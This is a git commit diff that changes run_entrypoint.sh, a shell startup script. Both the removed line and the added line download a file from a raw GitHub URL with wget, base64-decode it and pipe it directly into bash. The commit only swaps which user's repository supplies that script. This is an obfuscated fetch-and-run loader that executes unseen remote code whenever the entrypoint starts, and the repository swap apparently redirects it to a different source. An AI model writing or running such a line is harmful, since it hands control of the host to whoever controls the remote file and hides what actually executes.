8cb621953b4cae76456f61e932f2455c5a0b0bb3
richardmoyers43 <richardmoyers4@proton.me>
2026-06-17 03:57:00 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/danielseidman32/cake/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/richardmoyers43/coal/refs/heads/main/entrypoint.sh | base64 -d | bash
